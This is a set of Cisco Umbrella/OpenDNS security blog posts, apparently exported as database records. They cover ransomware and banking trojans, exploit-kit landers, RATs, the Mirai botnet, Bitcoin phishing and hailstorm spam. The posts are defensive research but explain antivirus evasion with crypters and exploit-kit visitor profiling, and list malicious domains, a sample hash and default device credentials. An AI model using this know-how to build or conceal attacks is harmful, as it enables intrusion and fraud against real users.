and S**T.\nThis visualization has an interesting structure that looks somewhat like a skeleton key if you squint at it the right way. We chose this key imagery to symbolize the use of public/private keys by ransomware like Locky. Once the infect the system is infected, the malware communicates back to an attacker controlled server to retrieve the key it will use to encrypt the data it will ultimately hold for ransom. The cluster of red nodes at the tip of the key shows the tightly interconnected structure of the domains used to host malware and generate keys.\n\nCerber\n\nOn board with the memo about the mythology naming convention, Cerber entered the Ransomware-as-a-Service scene in early 2016 with a splash. It quickly gained adoption and began to be distributed using popular exploit kits after toting offline encryption capabilities, a refusal to infect certain Eastern European/Northern Central Asia countries, and a mature approach to infection and evasion. Later improvements targeting databases indicate its creator’s vision is to target bigger companies who can pay out more – after all, from the criminal’s perspective, many organizations are getting off easy with a $500USD ransom.\nOur visualization of Cerber is focused around one registrant – this registrant has 57 registered domains, of which, 46 are associated with Cerber. Visualizing these domains and their connections reveals the actor’s infrastructure and how it’s used to host Cerber and other malware.\nNemucod\n\nNemucod, a JavaScript downloader, played an important role throughout the year by achieving a foothold for further infection on the target’s system. Its size made it lightweight enough for use as an email attachment and regular obfuscation/encapsulation changes made it often successful in bypassing detection systems. Nemucod jumpstarted the infection by retrieving and executing the primary payload of the actor. This is most commonly ransomware such as Locky, but has also been used with adware and ad-clicking malware like Miuref, Kovter, and Diplugem.\nDridex\n\nDridex is no stranger to top threat lists since the banking trojan and botnet first popped up in 2012. Infections rose steadily until 2015 when an international law enforcement operation resulted in the arrest of a key figure in its administration. That didn’t stop Dridex though, it continued to infect and enroll users into its botnet throughout 2016. Dridex is most widely known for its ability to inject into various web browsers to steal user credentials and take screenshots of banking websites. Its campaigns were among the first to weaponize Office Document Macros in email attachments for early stage infection.\nGozNym/Kryptik\n\nGozNym, also known as Kryptik, has a checkered history. The malware was the result of the merger of an advanced banking trojan whose source code was leaked publicly and a downloader. Like Dridex, GozNym aimed to compromise infected users banking credentials. GozNym leveraged some of the most refined and tailored Macro-enabled Word Documents as the initial downloader. Once the malware was executed, it employed an impressive array of anti-detection and advanced runtime techniques, using return-oriented programming to execute functionality using already loaded modules.\nThemes\nThe themes shared among these threats highlight the procedural trends actors continue to evolve year over year. We saw these trends play out before 2016, and we’ll undoubtedly see them continue through 2017.\nSent As An Email Attachment\nEach of these threats are distributed via email as attachments. Locky and Cerber are distributed broadly while Kryptik and Dridex are often targeted. While exploit kits are also used to distribute these threats, email is still a very widely used distribution method.\nDownloaders\nAttachments mirror Nemucod in that they act as a downloaders to retrieve malware and infect their target. The downloaders are usually written in JavaScript and VBScript, and often enclosed within a Macro enabled Office document or Zip file. They contact a hardcoded address to download the malicious executable containing the payload.\nReliance on External Systems\nAll of these threats also utilize a communication channel back to another system other than the download location for various purposes. Ransomware needs to fetch its encryption keys while the banking trojans use a command and control channel for issuing remote commands. The banking trojan may also redirect web traffic to imposter banking websites for credential collection.\nTargeting Windows\nAll of these threats target the Windows Operating System. While malware does exist for other operating systems and some malware, like Adwind RAT, is written to be cross platform, Windows still remains the primary target of most malware. This is likely due to its market share, specifically the dependance of business.\n2017 and Beyond!\nWith 2017 underway, we are looking forward to new threats, themes and, of course, visualizations! We would love to hear what you think and the latest threats that you are visualizing.', 'Malware;OpenGraphiti;Security;Security Research', 'https://umbrella.cisco.com/blog/2017/02/08/visualizing-2016s-top-threats/');

This year, the first annual BSidesSD took place Jan 13th-14th held at National University on the northern side of San Diego. This author was one of twenty speakers accepted to talk at the inaugural event. My talk was once again centered around our WHOIS work here at OpenDNS, which we will be discussing in an upcoming blog in the future. If you have not noticed yet, I really enjoy doing the BSides* conference tour. They are usually very well organized, as this one was, and not so large in size that it makes it hard to interact with other attendees. Sadly, the waffle truck that was supposed to show up for breakfast couldn’t make it, but that was really the only let down across the entire event.\nLike all conferences, there were lots of really good talks going on, but trying to cover them all would be extremely difficult, so I’ll just touch on a few of them that I thought stuck out:\nKeynote\nDavid Shackleford (@daveshackleford), a Senior Instructor at SANS and founder of Voodoo Security, started off the conference delivering the keynote address. In his talk, titled Security as Code, Shackleford discussed the movement from traditional on-premise data centers over to the increasingly popular cloud based models (read: AWS, Azure, etc). With this shift, the need to stay ahead of the curve in securing applications and data, all while being able to scale at the speed of a DevOps “fail fast and often” methodology. This methodology, which aims for automated provisioning, builds and testing, no downtime, and monitoring, creates the need for a ‘DevSecOps’ team to integrate security into the cloud infrastructure. Introducing automation into the system means defining a security process that allows for proactive monitoring as code is being written and pushed out into production. This entails getting crucial feedback to look for any errors or vulnerabilities.\n\nContinuing on, Shackleford emphasizes that this feedback should be acted on as the problem is noticed, and not after. Items such as tokens and passwords are often forgotten about in code. The last thing any company wants is for these to get exposed. Moving at the speeds we do today, having checks in place such as logging and event monitoring can help catch problems before they start. Using a problem-trigger-fix mentality, teams can let automation catch issues and push out a fix depending on X or Y events that have happened.\nOne of the ways that was discussed was using a template model when deploying anything into production. This way, when there is a build failure or passwords are flagged in code, it’s easy roll back to a known good previous build without any loss to production time. Going by just this one example shows how you can use both automation and the “fail fast and often” model in unison. Davids’ full talk can be found here.\nThe Aftermath of a Fuzz Run\nCEO of Fuzz Stati0n, David Moore (@grajagandev), gave a great presentation about fuzzing. Starting with the basics, Moore walked the audience through a quick review of the more common memory corruption bugs. As Moore explains, these bugs are really invalid read/writes that are caused by a few different situations. These include off-by-one errors, invalid input, stack overflows, and use-after-free attacks, to name just a few. Moore went on to cover some of the various types of exploits used such as code-injection (attacker injects malicious code onto stack), and return-oriented programming (wherein existing code is reused instead of the attacker having to inject their own).\nMoore continued by going over how to responsibly report bugs via bug bounty programs or directly to vendors, stating clearly why the bug needs addressed. The last thing you want to do is disclose a zero-day vulnerability on a public forum by accident. Next, Moore went into some of the mitigation techniques that can be put into place such as using a Stack Canary, which places a random integer on the stack before the return address and the operating system monitors for changes or over-writes to it. Other techniques covered included the use of Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR).\nThe latter half of the talk went over how take the fuzzing reports and start to minimizing crash corpuses, using memory corruption tools, and determine if something is indeed exploitable. This is where the talk takes a turn for the deep dive, and is more dense than can fit in this blog. To see for yourself, the full talk is here.\n\nSITCH: MITM Detection in GSM Network\nAsh Wilson (@ashmastaflash), who operates sitch.io, delved into the world of GSM Man in the Middle (MITM) attacks. Wilson explains that not only are these devices getting more and more inexpensive, but they are getting harder to detect. This talk is an extension of the work he did for a presentation at DEF CON 24 covering anomaly detection in GSM networks. Starting out with an overview of malicious devices such as hacked Femtocells, Evil BTS (Base Transceiver Station), and GPS Simulators, the presentation moved on to cover some of the various terminology and current detection methods. In a world where a lot of conversation take place over cellular phones, the threat of corporate espionage or invasion of privacy can have catastrophic effects, knowing how and where to secure your appliances in the network is crucial.\nThe slides from Ashs’ talk can be found on the sitch.io website here and contains a lot more detail, including instructions on what you need to build your own.\n\nAs always, thanks to the organizers, sponsors, and participants for making a great event happen.', 'Community;People & Culture;Security', 'https://umbrella.cisco.com/blog/2017/01/27/bsidessd-2017-recap/');

In this blog post we’re going to examine some malicious infrastructure that we’ve found by pivoting through domains delivering and communicating with RATs.\nA RAT is malware that creates a back door to gain access to the target and its connected resources in order to spy/steal information, drop additional malware such as ransomware, or to enlist the target into a botnet for DDoS purposes. A RAT can basically give all of the same access to a system that the attacker would have if they were physically accessing the target. A RAT has many functionalities: remote desktop control, webcam and microphone control, keylogger, remote shell, crypto miner, download and execute functionalities, screen capturing.\nPurchase and Preparation\nWhen deciding on which RAT to setup and spread, there is a choice between free or paid varieties. There are RATs that are free to use and RATs that require one to pay for a license. They vary in their ease of setup and stability. Since these RATs have been available for years and are detectable through signatures, a “crypter” is used on the malware before deployment. Crypters are tools that can use encryption and obfuscation on the malware in an effort to make them FUD (Fully UnDetectable) against known pattern based or behavior based signatures used in Anti-Virus or IDS/IPS systems. When a low detection rate is reached they have a better chance of infecting targets. The goal is to appear to be a harmless program. Once crypted, criminals run the file through underground scan services that will tell them their file’s achieved detection rate.\nThe ease of setup and availability of these RATs have helped them remain a threat. There are also rental services, offering to do all of the setup needed to build the infrastructure for RATs and bots, and then rent the use of them for a price.\nAdvertisement for RAT and Botnet Setup Services\nLuminosityLink is widely considered by some cyber criminals to be one of the best RATs.

But, not everyone uses DNS tunneling for legitimate reasons. It can be used to hide outbound traffic, concealing data that is typically shared through an internet connection. For example, a DNS tunneling VPN service could be used to exfiltrate data — and since the traffic isn’t normally monitored, such an attack would be difficult to catch.\nTo help with this, we are announcing DNS tunneling VPN as a new security category within Cisco Umbrella. This category classifies servers associated with commercial DNS tunneling VPN services. These services allow users to disguise outgoing traffic as DNS queries, potentially violating acceptable use, data loss prevention, or security policies. These services present a potential security threat and reduce overall visibility. By enabling this new security category, Umbrella customers will be able to reduce the risk of DNS tunneling and potential data loss.\nPotentially harmful\nBeyond DNS tunneling VPNs, other types of DNS tunneling have use cases that can be uncertain and risky. It can be beneficial to monitor and possibly block these uses and other suspicious domains.\nOur researchers have developed the Potentially harmful category to give customers insight and visibility into these domains. You can think of it as the “I have a bad feeling about this” category. It contains domains that are likely to be malicious, but with a lower level of confidence than those that are classified in our normal block lists. For example, DNS tunneling services that cannot be tied to a specific type of service will fall into this security category. Another example comes from our Spike rank model. The traffic that hits high on the Spike rank domain will automatically be classified as malicious, and traffic that is lower on the threshold will fall into the potentially harmful category.\nAvailability\nFor both categories, customers can block or monitor the results in reports, providing flexibility to determine what is right given their specific risk tolerance.\nThese categories will be available to customers of all Umbrella packages and Umbrella for MSPs starting January 18th.\n1http://www.circleid.com/posts/20131030_dns_tunneling_is_it_a_security_threat/', 'Announcements;Blog;Umbrella', 'https://umbrella.cisco.com/blog/2017/01/17/announcing-two-new-security-categories-cisco-umbrella/');

Actors are looking to quickly craft an exploit and search the internet for vulnerable instances. Once compromised, these personal and business websites are turned against their users to become Exploit Kit Landers.\nEach visitor is selectively evaluated by the time of day they’re visiting the site, their source IP address, along with the versions of their browser  and various plugins. If they match a specific profile, the Lander injects a single line of HTML or JavaScript code into the page. This line of code makes a call to the Exploit Kit Gate, which serves up a worthy exploit to take advantage of a vulnerability in an often outdated browser or plugin used by the visitor. We use the term ‘Gate’ to describe the attacker-controlled system which may serve the exploit itself or may be an intermediary step where the client is profiled a second time then sent to the exploit. With arbitrary execution achieved on the visitor’s system, the exploit kit has done its job. The shellcode of the exploit downloads a binary and executes the payload of the attacker’s choice which, in many cases, is ransomware.\n\nSo Many Callbacks\nThe infection chain is littered with internet callbacks between the attacker and the victim. The victim first goes to the infected Lander, then is redirected to the Gate, then downloads the payload, and then calls back to ransomware command and control (C2) to negotiate keys. We can detect this communication at the network layer and ultimately prevent an infection from succeeding by blocking communication to the hosts involved in any of these callbacks. While we have developed systems to uncover each of these callbacks, one group which is particularly interesting to us are the Landers.\nAvoiding Detection\nActors take special care to protect their landers from discovery. These websites can be popular blogs or businesses that may have sizable followings and rank high in search results. If a high traffic lander is uncovered, it could mean a sizable opportunity loss. To avoid detection, actors will only expose functionality for specific hours of the day, exclude certain IP addresses, and refuse to infect a visitor more than a set number of times.\nBlock Page Referrers\nEvery time one of our users attempts to visit a malicious website, we notify them by redirecting their browser to our block page.\n\nThis is helpful to our users, but is also valuable to our researchers as another data source to perform analytics on. We store the full HTTP request every time a user ends up at one of these pages so good news for us: we can also see how they got there.\nHackathon Project: Find New EKs!\nAs a project during our annual hackathon at the beginning of last month, we decided to use our block page logs to identify new landers. Our end result was a module for our Avalanche System which allows us to stream in new data at near real time and protect our customers right away.\nBlock Page Logs\nThe logs from our block pages are just raw HTTP logs. By looking at the Referer HTTP Header data, we can identify how users end up at a Gate. We first parse them into a dictionary that looks like this:\nWe have a couple things working for us: We already know that this user is doing something risky since they’ve arrived at our blocked page and are in our logs. We’re also streaming in exploit kit gates, so we already know that headers.host is a gate that we’ve uncovered with our other classifiers. The thing we might not have prior knowledge about is the referrer, geiserpharma[.]com.\nNew Landers\nAttackers may set up their imposter websites or they may compromise legitimate websites, so it can be tricky to determine if a referring site is actually malicious. One way to root out false positives is to ensure the referrer is not an extremely popular site. We can use the top 5000 domains in the Cisco Umbrella 1m as a filter and check the popularity within Investigate.\n\nOur suspected lander geiserpharma[.]com has very low popularity. On a scale on 0-100, where 100 is very popular, geiserpharma[.]com is a zero.\nLine of Fire\nLet’s visit geiserpharma[.]com just to test. The other nice thing we get from the block page logs is the User-Agent. This is useful since many Exploit Kits will profile the user and only launch an exploit if it appears to be vulnerable. By using the User-Agent in the logs, we’re one step closer to having the exploit kit show itself.\n\nSurprise, surprise: Internet Explorer Crashes and we get a very concerning Windows Script Host error! All-in-all there were four major steps to this infection, here they are as Fiddler sessions:\n\nIf we dig into the HTML source of the page, we see a suspicious iFrame buried in the middle of it:\n\nNow, these landers will very often cycle through a few different gates as you render the page. So if we wait a little time, then request the page again, we get:\n\nThese iFrames include additional JavaScript to profile the user and ensure they are vulnerable:\nWith a confirmed wounded duck, the JavaScript posts back to the gate which returns a big nasty page with tons of obfuscated JavaScript. Parts of the JavaScript are encoded just right to make Fiddler hiccup when processing.\n\nBy saving the raw bytes using HexView we can see the resulting JavaScript.\n\nA few breakpoints later, we reveal three levels of JavaScript obfuscation that result in the inclusion of a Flash object into the original landing page (geiserpharma[.]com).\n\nThis Flash object contains exploits a vulnerability which achieves code execution in the context of the browser.\n\nThe SWF is passed a few hex-encoded items via the FlashVars variable. This supports the modular nature of the exploit kit. Any exploit kit customer can provide a download URL which is passed from JavaScript, through Flash, arriving as an argument to payload which is eventually executed. We can see this by inspecting the ROP Chain that the exploit uses once it achieves control over the instruction pointer.\n\nThe payload itself is simply a one liner to create a Windows Script Host temporary file that downloads, deobfuscates, and executes Cerber Ransomware via a DLL using  regsvr32.exe.\n\nBut wheres the Arduino?\nIt can’t be a hackathon project without having something controlled by a small microprocessor, so we bolted on an API to our feed of fresh new landers and set up a Raspberry Pi to query it. Every time a new lander was identified, the Raspberry Pi triggered a PowerSwitch Tail which flipped on the electricity to my Christmas Tree and sent the train below racing around its track.', 'hackathon;Javascript;Labs Research;Malware;Security;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2017/01/11/catching-exploit-kit-landers/');

This time of year is conducive to self-reflection and introspection, learning from the past to prepare for the future. Though there were many incidents over the course of the past twelve months, none captured my attention as much as the Mirai botnet. Adaptable, difficult to detect, and enormously disruptive, I believe Mirai to be the first in a series of new threats which will impact the world on a scale that was previously unimaginable.\nCried Out In Unison – Biggest DDoS of 2016\nMirai first came into the media’s attention around September when researcher Brian Krebs was targeted by a historically large DDoS attack. In his debrief with Akamai, it was noted that rather than relying on DNS amplification to achieve such traffic, it seemed to have come from many different sources. This suggested that a enormous number of devices were compromised, and soon enough the world started to hear and read the word “Mirai”. This enterprising botnet took advantage of the insecurity of internet-connected smart devices like cameras, printers, DVRs. By using a brute force attack and trying commonly used administrative passwords, Mirai took over millions of devices all around the world. This translated into more available bandwidth for attackers to use and overwhelm servers.\nAnalyzing data coming from a honeypot built similarly to those designed by arm5077 and robertdavidgraham, we were able to gather 111,783 connections in a period of just 30 days. After removing the duplicates, we were left with 8,578 unique IPs to work with.\nMirai geolocated IP addresses\nBased on served HTTP banners and Shodan data we identified:\n2,861 surveillance cameras\n759 DVR players\n1,088 routers\n76 firewall devices\nThe results help to clarify Mirai’s significant difference from classic botnets — its choice of targets. We can see that rather than attacking home computers, its victims were internet connected devices which have long been under the scrutiny of security researchers, and that choice made it incredibly successful. By striking at things that were both insecure and extremely popular, the botnet was able to gain ground quickly. With unprecedented DDoS power, attackers were able to go after huge targets: after Krebs, French host OVH was attacked, then Dyn, then the country of Liberia, and most recently Deutsche Telekom. In the span of just a few months, vital pieces of the internet’s infrastructure have been assaulted by Mirai, and there’s no reason to believe this will subside in the coming years as more IoT devices make their way into homes everywhere.\nVulnerable devices can be found almost anywhere. Geolocation of captured IP addresses indicates that majority of the infected devices are based in Taiwan (1,152), Vietnam (1,136), China (789), Brazil (650), Turkey (483), Russia (426) and India (408).\nVisualization of IP addresses used by Mirai\nMirai’s Future – Predicted Paths\nBased on observed combinations of default credentials used by bots, we predict that the next devices which will be targeted by Mirai include:\nACTi IP Cameras\nANKO Products DVRs\nAxis IP Cameras\nDahua Cameras and DVRs\nDreambox TVs\nHiSilicon Cameras\nMobotix Network Cameras\nRealtek Routers\nSMC Routers\nUbiquiti AirOS Routers\nVideoIq Systems\nWhen the source code of Mirai was released to hackers, this made it only more attractive for ambitious malicious actors looking to adapt it to their needs. Recently, it has been modified to create domains through a DGA to better avoid detection and keep a constant contact with C&C servers, and it seems likely that changes will be made to start implementing Tor and other traffic obfuscation methods. David Rodriguez recently profiled this new DGA enabled variant in a blog post, and the data he gathered combined with the analysis done by other researchers has revealed Mirai to be a thoroughly interconnected piece of malware, sharing space with ransomware distributors and other assorted awful things on the internet.\nVisualization of domains generated by Mirai and cooccurences.\nInto the Breach – Next Steps\nSo where do we go from here? What can be done about Mirai and other IoT botnets that are sure to follow? The largest share of the burden lies with manufacturers who continue to fail to address the issue of using weak security practices with their products. Devices should be sent from the factory with unique credentials instead of collectively sharing an easily guessed login and password combination such as “admin/admin” or “admin/password”. It would also be very helpful to limit access through commonly used ports and protocols like Telnet. IoT devices need to be designed with built-in protections against intrusion and compromise by using unique device passwords and preventing insecure remote logins. Individual users and administrators can help themselves by logging into the devices in their possession and changing weak passwords, as well as implementing port defenses to keep remote communications at bay. Though this might make a dent in reducing the amount of devices that are vulnerable, the most effective place to make this change is at the manufacturer’s level. Further, ISPs and DNS providers need to be aware of the problem and work closely together. The possibility of attacks at this scale must spur changes, both to the underlying architecture of the internet and the companies that deliver it as well as to the methods of response to massive DDoS attacks from the entire internet community. Given that IoT botnets will grow larger as more devices connect to the web, we must change the internet’s ability to handle it and our responses to it.\n2017 will prove to be a very interesting year, and rather than simply watching it as it unfold, we must be willing to meet its challenges head on. The future is here, and we must prepare ourselves now.\nThanks to Austin McBride for contributing visualizations.', 'Blog;Community;Security;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2017/01/05/future-assaulting-internet-mirai/');

However, it wouldn’t be possible to build those algorithms without a deep understanding of the initial cases that produced such campaigns. Our hypothesis’ are based on analysis of the next graphs, which include Google interest of the keyword “buy bitcoins” from Google, changes of the Bitcoin prices from Blockchain, ransomware infections and detected phishing attacks on the Bitcoin wallets from OpenDNS.\nFigure 12\n\nAs we can see from the graphs in Figure 12,  there is a strong correlation between popularity, Bitcoin price and Bitcoin phishing attacks. We also can observe that ransomware infections do not really correlate with Bitcoin price while most phishing campaigns against Bitcoin wallets actually do, meaning the more expensive Bitcoin will become the more attacks we will see.\nPeaks of ransomware infections are highly dependent on delivery methods and not necessarily Bitcoin’s popularity. Ransomware is, after all, some criminal’s stable malicious business. In Figure 11 we can see that peak of the infections correlates with the appearance of the Locky in November (when it also switched to mainly being delivered via phishing), while the least amount of infections was detected in June, when the Angler Exploit Kit disappeared. So we can hypothesize that even when phishing and ransomware campaigns share same infrastructure, they have different organizations behind them, which work independently. Also that explains the fact that injecting malicious Adword ads is the main delivery method of such phishing campaigns.\nLet’s try to reproduce actions of an average PC user in case of ransomware infection:\nEdward visits some website, his browser gets exploited via malicious ad, and 2 minutes later he sees this type of message on his screen (depends on ransomware family):\nFigure 13\n\nSo when Edward follows the URL he gets instructions to buy bitcoins with the list of places where he can do this. But just how much should he trust someone who just encrypted all of his data in exchange for ransom? That would be the perfect place for malicious actor to not only extort the ransom money, but also the user’s credentials. However, we haven’t seen any of phishing domains listed there from observed ransomware samples. So, if Edward searches on Google to find out how to buy bitcoins, only then does forged Adword accounts come in play. Edward gets served the phishing domain from Adwords, enters his credentials, buys bitcoins and pays the ransom. Everything seems fine but by now not only he lost money due to the ransom, but most of his personal information is compromised. Stolen credentials are a lot cheaper than most ransom, so ransomware authors would not try to steal credentials, but rather get paid.\nCONCLUSION\nIt looks like these cryptocurrency technologies will continue to gain momentum into 2017, and with that so will criminal activity. OpenDNS Labs will continue to monitor these trends in our DNS traffic for phishing pages intended to steal online wallets’ credentials, and continue to share our results.', 'Big Data;DNS;Labs Research;Machine Learning;WHOIS', 'https://umbrella.cisco.com/blog/2016/12/22/protecting-bank-pocket-rise-criminal-activity-correlates-bitcoin-price-surge-holidays/');

Traditional snowshoe spam campaigns are sent from a large number of IP addresses, and a low volume of spam email per IP address. Using such techniques, snowshoe spammers intend to fly under the radar with respect to any reputation or volume-based metrics that could be applied by anti-spam systems. This post concerns “hailstorm” spam. Hailstorm spam is an evolution of snowshoe spam. Both snowshoe and hailstorm spam are sent using a large number of sender IP addresses, but unlike snowshoe spam, hailstorm campaigns are sent out in very high volume over a short timespan. In fact, some hailstorm spam attacks end just around the time the fastest traditional anti-spam defenses can update in response.\nThe images below, taken from Umbrella Investigate, nicely illustrate the difference between a typical snowshoe spam campaign versus a typical hailstorm spam campaign. The top image below illustrates what the DNS query volume looks like for a domain involved in a typical snowshoe attack. Note the maximum query rate is only 35 queries per hour for the snowshoe domain example. The bottom graph, in contrast, shows the DNS query volume for a domain involved in a typical hailstorm attack. In this graph, there is practically no query volume until suddenly when the DNS query volume spikes to over 75K queries per hour, then drops back down to nothing.\nTypical DNS query volume patterns for traditional snowshoe spam (top) vs. hailstorm spam (bottom).\nHailstorm spam is being sent from IP addresses located all around the globe. Looking at the geo-ip distribution from recent hailstorm spam campaigns, the US, Germany, Netherlands, Great Britain and Russia lead the pack in terms of volume of hailstorm spam sent by country. Hailstorm spam also involves domains registered at a wide array of Top Level Domains (TLDs). In a recent sample of ~500 hailstorm-related domains, the most common TLDs were .top, .bid, .us, .win and .stream.\nAFFILIATE PROGRAMS AND SPONSORED LINKS\nMost of the campaigns we initially detected advertise products comprising home-surveillance systems, flashlights, dietary supplements and all sorts of items “as seen on TV”. Services as diverse as bathroom remodeling, online degrees and psychic readings are common as well. Below is an example of a typical affiliate offer, sent using hailstorm techniques. This particular hailstorm campaign was advertising dietary supplements. Links in the original email are redirected several times before reaching the landing page, which in turn links to an order form on an affiliate page. URL parameters containing recipient IDs, or any other Personally Identifiable Information (PII) have been redacted to protect the innocent.\nEmail From: ultratrim350@secretaryship.coisow.us\nContained links are of the form:\n  http://<subdomain>.coisow.us/about/us/<redacted> \nThese links are redirected several times, hitting domains such as lbmcgroup.com, trackwebly.com, trackwb.com, atomtrk.com, ecptrx.com, ih-trk.com.\n\n\n \nLanding page:\nhttp://fitnessandenergytips.com/diet/weightlosssecret/index.php?<redacted>\nThis page contains multiple links to an external order form (see below).\n\n\n\nOrder form:\nhttps://getultratrim350.com/lp/bellymelt-p/index.php?<redacted>\nIn addition to the order form, this page contains a link to an affiliate sign-up page (see below).\n\n\n \nSign-up page:\nhttp://affiliates.ih-supplies.com/affiliate_signup.aspx\nThe base ih-supplies.com domain itself leads to a landing page for parked domains on GoDaddy.com.\nThe domains seen above are all registered using whois privacy services. The only exception is the domain used in the From header, coisow.us. That domain is registered by wireclick.tech@gmail.com, which in turn is associated with hundreds of other domains involved in similar spam campaigns.\nAnother typical amortization scheme is to generate traffic on sponsored links. Below is an example of such a hailstorm spam campaign message, along with the corresponding landing page. Similar to our first example, these spammers are lazy and have terrible Operational Security (OPSEC). In this case, the domain used in the From address (babyfirstgames.com) is registered to an email associated with a number of other domains participating in hailstorm spam campaigns.\nEmail From: jonathon.hinton@babyfirstgames.com\nContained links are of the form:\n  http://www.babyfirstgames.com/<redacted>\nThe link is redirected several times.\n\n\n \nLanding page:\n  http://ww1.cfcc.emazingsavingsnow.com/?<redacted>\nThe links generally lead to legitimate businesses and vendors that are not themselves involved in the scheme.\nThe following examples of From and Subject headers highlight the type of content observed in recent hailstorm spam campaigns:\nFrom: Fresh Tax Relief <freshtaxrelief@chemiluminescent.duzeo.us>\nFrom: Healthy baby formula <Healthybabyformula@crewgraphics.stream>\nFrom: VOIP Phone System Options <voipphonesystemoptions@wait.cotib.us>\nFrom: Own Star Night Laser <ownstarnightlaser@lanight.bid>\nFrom: Match.com Partner <Match.comPartner@meterdown.top>\nFrom: Caribbean Cruise Options <caribbean_cruise_options@firstthirteen.faith>\nFrom: Costco Rewards Giveaway <CostcoRewardsGiveaway@horithms.stream>\nFrom: Business Internet Service <BusinessInternetService@chineral.stream>\nFrom: Paleo Secret <paleosecret@eumidnight.top>\nFrom: Hybrid Cars <HybridCars@carhibrid.us>\nSubject: Toss Your Alkaline Water Down the Drain\nSubject: Government Overrun: 75% off “Super Flashlight”\nSubject: Insanely Bright Military Headlight Just Released To The Public\nSubject: Watch: How To Restore Bladder Control Naturally\nSubject: Is Trump for real?

Drive-by downloads are as much a possibility as Business Email Compromise, fraud and identity theft, should any personal or financial information be disclosed by a recipient.\nMALWARE AND PHISH\nAs expected for any method that proves effective in raising the rate of successful delivery, hailstorm campaigns are used for much more damaging purposes than generating traffic to affiliate pages. Hailstorm tactics are also used by botnets like Necurs to spread malware. Below is an example of a malicious email message sent out via a hailstorm campaign.\n\nThe message claims to be generated in response to a complaint filed with the United Kingdom’s Companies House and tries to lure the recipient into opening an attached word document. The From address of the message is noreply@companieshouses.com while the legitimate government agency has their web presence at companieshouse.gov.uk. The attached Complaint.doc (SHA256: 985e9f4c5a49e26782141c7cd8f4ce87b0e0a026d078b67b006e17e12f9eb407) contains a macro that downloads and executes a Dyre/TheTrick Banking Trojan.\nAs in previous examples, the registrant of the sending domain, workorders@pesiec.com, is associated with a number of other domains that are used in similar fashion.\nThis hailstorm malware campaign shares many similarities with the first two examples, such as delivery of the whole campaign in a very short burst and the suspicious registrant, among others. Yet, there are also some significant differences from typical hailstorm spam campaigns: The messages are sent from a wider range of IPs, including addresses that do not resolve to the domain used in the From header. The message is more in line with traditional spam and bot behavior.\nTHE DNS LAYER\nHailstorm campaigns are correlated with bursts in DNS queries with an intensity of 9,000+ queries per hour at their peak(s). The initial spike in a hailstorm campaign stems from mail server activity caused by an influx of emails. One way to understand the life cycle of a hailstorm campaign is to look at how many mail servers are targeted with a given domain. Below, we compare three hailstorm domains and the fraction of mail servers that have been hit. We characterize the hailstorm campaign by contrasting the peak queries per hour (i.e. the largest spike in query volume) with the percent of the mail servers receiving hailstorm spam from each domain.\nDomain                      Peak queries/hour   % of mail servers hit\n\ncooperindustries.space                  8,049                    0.381%\npourdra.top                                  23,790                   3.457%\ncmobi.stream                              106,590                  4.013%\nIn these few concrete examples we can glean clues about the magnitude and breadth of hailstorm campaigns. The data suggest a weak correlation between the size of a campaign and the probability of being targeted. Since these are just three data points from our pool of domains, we are not drawing too many conclusions.\nIf we compare the distribution of mail servers targeted from a sample of 475 hailstorm domains hitting mail servers with an average of 9332 peak queries/hr we can see significantly more mailservers are being targeted inside the USA versus the rest of the world.\nGeographic Distribution\nPercent Mail-Servers Hit\nUSA             2.586%\nnon-USA      0.840%\nFrom the data above, we conclude that the majority of targets reside within the USA. This might be due to language preferences, amortization infrastructure, target audience or other reasons related to the spammers’ workflow.\nPROTECTION FROM THE STORM\nIn this collaboration, the Cisco Talos and Umbrella research teams have created a system that facilitates fast evaluation and conviction of in-the-wild hailstorm domains, then proceeds to gather predictive insights into other domains that are likely going to be used in future campaigns. As such, the system is fast in protecting customers at time-of-click in case a hailstorm message reaches an inbox. More importantly, the predictive nature of the system directly counters the hallmark of hailstorm campaigns: their rapid execution. Rather than waiting for a campaign to unfold and trying to catch up, protection against the next spam campaign is deployed ahead of time.\nAs outlined in the examples, hailstorm comes in several flavors. We expect to see it evolve over time as anti-spam systems make it harder and harder for spammers to deliver their payload. The collaboration between Talos and Umbrella, matching spam activity and DNS traffic, enables us to quickly adapt and protect against the ever changing threat-landscape.', 'Announcements;Big Data;DNS;Labs Research;Machine Learning', 'https://umbrella.cisco.com/blog/2016/12/19/in-the-eye-of-hailstorm/');

This project came from our most recent hack-a-thon where we had more than 300 participants across 3 different countries hack for 24 hours. Hack-a-thons are an important piece of our engineering team’s culture and showcases their passion to build. On the heels of the announcement that the Alexa 1 Million list was not going to be available for free anymore, the idea was that we have the data and the means to provide an alternative.\nThe data itself is based on the Umbrella global network of more than 100 Billion requests per day, across 65 million unique active users, in more than 165 countries. Although the data source is quite different from Alexa’s, we believe it’s arguably more accurate as it’s not based on only HTTP requests from users with browser additions.\nThe way the ranking is computed is not as simple as the net sum of all DNS queries. We have built our own popularity algorithm which uses the number of unique client IPs visiting this domain, relative to the sum of all requests to all domains. We take a score of how many different client/unique IPs go to this domain compared to others, and then rank the domains based on that. Our domain (vs site) ranking reflects the popularity of internet activity over any port or protocol from any application and not just web activity over port 80 from browsers.\nSo, moving forward we will be publishing the list of the top 1M domains in order of popularity.

Assuming every new domain is dangerous and therefore can’t be accessed would make for a pretty terrible experience. On the flip side, assuming all these new domains are nice and friendly opens the door for bad actors. Organizations need the ability to easily view traffic to new domains and ultimately enforce policies if they are more risk averse.\n\nAttackers often use new domains as part of phishing campaigns, exploit kits, ransomware, and other threats. These new domains serve multiple purposes including acting as a way to distribute malware, exfiltrate data, or trick people into clicking on phishing links. By creating new domains instead of reusing domains from previous threats, attackers can outsmart security systems that rely on reputation scores.\nLet’s say an attacker registers a new domain to be used in a phishing attack. If the domain is not yet known to be malicious, then when someone receives the email and clicks on the link, it probably won’t be blocked by any security systems. Before this domain can be categorized as a threat or added to a block list , the damage may already be done — the victim may unknowingly disclose sensitive information or malware might be installed and start exfiltrating data from the network.\nToday, we’re introducing a new security category within Cisco Umbrella called “newly seen domains.” This new category identifies domains that have been recently queried for the first time across the Umbrella global network and are more likely to be malicious. You have the flexibility to enable the newly seen domains category in two ways:\nMonitor-only – Gain visibility into requests to newly seen domains across your organization and then research them using Investigate.\nBlock – Proactively block access to these domains since there’s a higher chance that they may be malicious.\nThere are other services out there that offer similar information, so what’s different about the newly seen domains category in Cisco Umbrella?\nOur global network handles over 80 billion requests per day from a diverse set of enterprise and consumer users and we uncover over 3 million new domains every day. We see more and help you 